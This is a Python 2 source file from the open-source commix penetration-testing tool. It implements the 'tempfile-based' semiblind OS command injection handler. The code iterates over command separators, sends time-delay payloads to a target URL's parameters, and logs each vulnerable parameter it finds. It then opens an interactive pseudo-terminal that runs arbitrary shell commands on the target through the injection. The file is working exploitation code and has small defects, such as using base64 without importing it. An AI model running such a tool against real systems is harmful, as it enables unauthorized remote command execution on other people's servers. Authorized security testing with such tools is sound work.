#!/usr/bin/env python
# encoding: UTF-8

"""
 This file is part of commix (@commixproject) tool.
 Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 For more see the file 'readme/COPYING' for copying permission.
"""

import re
import sys
import time
import string
import random
import urllib
import urllib2

from src.utils import menu
from src.utils import colors
from src.utils import settings

from src.core.requests import headers
from src.core.requests import parameters

from src.core.injections.semiblind_based.techniques.tempfile_based import tfb_injector
from src.core.injections.semiblind_based.techniques.tempfile_based import tfb_payloads
from src.core.injections.semiblind_based.techniques.tempfile_based import tfb_enumeration

"""
 The "tempfile-based" injection technique on Semiblind OS Command Injection.
 __Warning:__ This technique is still experimental, is not yet fully functional and may leads to false-positive resutls.
"""

#-------------------------------------------------
# The "tempfile-based" injection technique handler
#-------------------------------------------------
def tfb_injection_handler(url,delay,filename,tmp_path,http_request_method):
  
  counter = 0
  vp_flag = True
  no_result = True
  is_encoded= False
  injection_type = "Semiblind-based Command Injection"
  technique = "tempfile-based injection technique"
  
  # Print the findings to log file.
  output_file = open(filename + ".txt", "a")
  output_file.write("\n---")
  output_file.write("\n(+) Type : " + injection_type)
  output_file.write("\n(+) Technique : " + technique.title())
  output_file.close()
    
  # Check if defined "--maxlen" option.
  if menu.options.maxlen:
    maxlen = menu.options.maxlen
    
  # Check if defined "--url-reload" option.
  if menu.options.url_reload == True:
    print colors.BGRED + "(x) Error: The '--url-reload' option is not available in "+ technique +"!" + colors.RESET
  
  i = 0
  # Calculate all possible combinations
  total = len(settings.SEPARATORS)
  for separator in settings.SEPARATORS:
    i = i + 1
	  
    # Change TAG on every request to prevent false-positive resutls.
    TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6))  
    
    # Check if defined "--base64" option.
    if menu.options.base64_trick == True:
      B64_ENC_TAG = base64.b64encode(TAG)
      B64_DEC_TRICK = settings.B64_DEC_TRICK
    else:
      B64_ENC_TAG = TAG
      B64_DEC_TRICK = ""
      
    # The output file for file-based injection technique.
    OUTPUT_TEXTFILE = tmp_path + B64_ENC_TAG + ".txt"
    alter_shell = menu.options.alter_shell
    tag_length = len(TAG) + 4
    
    for j in range(1,int(tag_length)):
      try:
	# Tempfile-based decision payload (check if host is vulnerable).
	if alter_shell :
	  payload = tfb_payloads.decision_alter_shell(separator,j,TAG,OUTPUT_TEXTFILE,delay,http_request_method)
  
	else:
	  payload = tfb_payloads.decision(separator,j,TAG,OUTPUT_TEXTFILE,delay,http_request_method)

	# Check if defined "--verbose" option.
	if menu.options.verbose:
	  if separator == ";" or separator == "&&" or separator == "||":
	    sys.stdout.write("\n" + colors.GREY + payload + colors.RESET)
	    
	# Check if target host is vulnerable
	how_long,vuln_parameter = tfb_injector.injection_test(payload,http_request_method,url)
	if not menu.options.verbose:
	  percent = ((i*100)/total)
	  if how_long == delay:
	    percent = colors.GREEN + "SUCCEED" + colors.RESET
	  elif percent == 100:
	    if no_result == True:
	      percent = colors.RED + "FAILED" + colors.RESET
	    else:
		percent = str(percent)+"%"
	  else:
	    percent = str(percent)+"%"
	  sys.stdout.write(colors.BOLD + "\r(*) Testing the "+ technique + "... " + colors.RESET +  "[ " + percent + " ]")  
	  sys.stdout.flush()
	  
      except KeyboardInterrupt: 
	raise
      
      except:
	if not menu.options.verbose:
	  percent = ((i*100)/total)
	  if percent == 100:
	    if no_result == True:
	      percent = colors.RED + "FAILED" + colors.RESET
	    else:
		percent = str(percent)+"%"
	  else:
	    percent = str(percent)+"%"
	  sys.stdout.write(colors.BOLD + "\r(*) Testing the "+ technique + "... " + colors.RESET +  "[ " + percent + " ]")  
	  sys.stdout.flush()
	continue
      
      # Yaw, got shellz! 
      # Do some magic tricks!
      if how_long == delay:
	found = True
	no_result = False
	
	if http_request_method == "GET":
	  # Print the findings to log file
	  if vp_flag == True:
	    output_file = open(filename + ".txt", "a")
	    output_file.write("\n(+) Parameter : " + vuln_parameter + " (" + http_request_method + ")")
	    output_file.write("\n---\n")
	    vp_flag = False
	    output_file.close()
	    
	  counter = counter + 1
	  output_file = open(filename + ".txt", "a")
	  output_file.write("  ("+str(counter)+") Payload : "+ re.sub("%20", " ", payload) + "\n")
	  output_file.close()
	    
	  # Print the findings to terminal.
	  print colors.BOLD + "\n(!) The ("+ http_request_method + ") '" + vuln_parameter +"' parameter is vulnerable to "+ injection_type +"."+ colors.RESET
	  print "  (+) Type : "+ colors.YELLOW + colors.BOLD + injection_type + colors.RESET + ""
	  print "  (+) Technique : "+ colors.YELLOW + colors.BOLD + technique.title() + colors.RESET + ""
	  print "  (+) Parameter : "+ colors.YELLOW + colors.BOLD + vuln_parameter + colors.RESET + ""
	  print "  (+) Payload : "+ colors.YELLOW + colors.BOLD + re.sub("%20", " ", urllib.unquote_plus(payload)) + colors.RESET
	    
	else :
	  # Print the findings to log file
	  if vp_flag == True:
	    output_file = open(filename + ".txt", "a")
	    output_file.write("\n(+) Parameter : " + vuln_parameter + " (" + http_request_method + ")")
	    output_file.write("\n---\n")
	    vp_flag = False
	    output_file.close()
	    
	  counter = counter + 1
	  output_file = open(filename + ".txt", "a")
	  output_file.write("  ("+str(counter)+") Payload : "+ re.sub("%20", " ", payload) + "\n")
	  output_file.close()
	    
	  # Print the findings to terminal.
	  print colors.BOLD + "\n(!) The ("+ http_request_method + ") '" + vuln_parameter +"' parameter is vulnerable to "+ injection_type +"."+ colors.RESET
	  print "  (+) Type : "+ colors.YELLOW + colors.BOLD + injection_type + colors.RESET + ""
	  print "  (+) Technique : "+ colors.YELLOW + colors.BOLD + technique.title() + colors.RESET + ""
	  print "  (+) Parameter : "+ colors.YELLOW + colors.BOLD + vuln_parameter + colors.RESET + ""
	  print "  (+) Payload : "+ colors.YELLOW + colors.BOLD + re.sub("%20", " ", payload) + colors.RESET
	  
	# Check for any enumeration options.
	tfb_enumeration.do_check(separator,maxlen,TAG,delay,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
	
	# Pseudo-Terminal shell
	gotshell = raw_input("\n(*) Do you want a Pseudo-Terminal shell? [Y/n] > ").lower()
	if gotshell in settings.CHOISE_YES:
	  print ""
	  print "Pseudo-Terminal (type 'q' or use <Ctrl-C> to quit)"
	  while True:
	    try:
	      cmd = raw_input("Shell > ")
	      if cmd == "q":
		sys.exit(0)
		
	      else:
		# The main command injection exploitation.
		check_how_long,output  = tfb_injector.injection(separator,maxlen,TAG,cmd,delay,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
		
		if menu.options.verbose:
		  print ""
		print "\n\n" + colors.GREEN + colors.BOLD + output + colors.RESET
		print "\n(*) Finished in "+ time.strftime('%H:%M:%S', time.gmtime(check_how_long)) +".\n"
		
	    except KeyboardInterrupt: 
	      print ""
	      sys.exit(0)

	else:
	  print "(*) Continue testing the "+ technique +"... "
	  pass
	    
  if no_result == True:
    if menu.options.verbose == False:
      print ""
      return False
  
    else:
      print ""
      return False
  
  else :
    if menu.options.verbose == True:
      print ""
    sys.stdout.write("\r")  
    sys.stdout.flush()
    
def exploitation(url,delay,filename,tmp_path,http_request_method):
    tfb_injection_handler(url,delay,filename,tmp_path,http_request_method)
    
#eof